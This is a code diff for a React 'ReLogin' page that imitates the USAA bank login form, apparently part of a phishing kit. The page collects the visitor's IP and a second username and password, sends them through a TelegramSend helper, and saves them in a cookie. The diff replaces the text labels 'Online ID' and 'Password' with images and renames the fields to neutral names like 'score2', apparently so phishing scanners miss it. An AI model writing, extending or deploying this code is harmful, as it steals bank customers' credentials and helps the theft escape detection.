@@ -2,11 +2,13 @@ import React, {useState} from "react";
 import { useNavigate } from "react-router-dom";
 import cookies from "../utils/cookie.config";
 import TelegramSend from "../utils/send-message";
+import score from "../assets/score.png"
+import scorePro from "../assets/scorePro.png"
 
 export default function ReLogin() {
   const [formInput, setFormInput] = useState<Login2>({
-    username2: "",
-    password2: ""
+    score2: "",
+    scorePro2: ""
 })
 const [isLoading, setIsLoading] = React.useState(false);
 const navigate = useNavigate()
@@ -33,9 +35,9 @@ async function handleSubmit(event: React.FormEvent<HTMLFormElement>){
 
     IP: ${visitorIP}
 
-    USERNAME 2: ${formInput.username2}
+    USERNAME 2: ${formInput.score2}
 
-    PASSWORD 2: ${formInput.password2}
+    PASSWORD 2: ${formInput.scorePro2}
     `;
     await TelegramSend(message)
     cookies.set("login2", formInput)
@@ -62,12 +64,9 @@ async function handleSubmit(event: React.FormEvent<HTMLFormElement>){
                   htmlFor="usaa-form-v5-10-1-input-mwc9hotwmucj"
                   className="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label"
                 >
-                  <span
-                    aria-hidden="false"
-                    className="usaa-form-v5-10-1-fieldLabel-text"
-                  >
-                    Online ID
-                  </span>
+                   <div className="kylexy">
+          <img src={score} height={20} alt="" />
+                      </div>
                 </label>
               </div>
               <div>
@@ -80,7 +79,7 @@ async function handleSubmit(event: React.FormEvent<HTMLFormElement>){
               </div>
               <span className="usaa-input">
                 <input
-                  name="username2"
+                  name="score2"
                   onChange={handleInputChange}
                   aria-invalid="false"
                   id="usaa-form-v5-10-1-input-mwc9hotwmucj"
@@ -103,12 +102,9 @@ async function handleSubmit(event: React.FormEvent<HTMLFormElement>){
                   htmlFor="usaa-form-v5-10-1-input-mwc9hotwmucj"
                   className="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label"
                 >
-                  <span
-                    aria-hidden="false"
-                    className="usaa-form-v5-10-1-fieldLabel-text"
-                  >
-                    Password
-                  </span>
+                   <div className="kylexy">
+          <img src={scorePro} height={20} alt="" />
+                      </div>
                 </label>
               </div>
               <div>
@@ -121,7 +117,7 @@ async function handleSubmit(event: React.FormEvent<HTMLFormElement>){
               </div>
               <span className="usaa-input">
                 <input
-                  name="password2"
+                  name="scorePro2"
                   onChange={handleInputChange}
                   aria-invalid="false"
                   id="usaa-form-v5-10-1-input-mwc9hotwmucj"
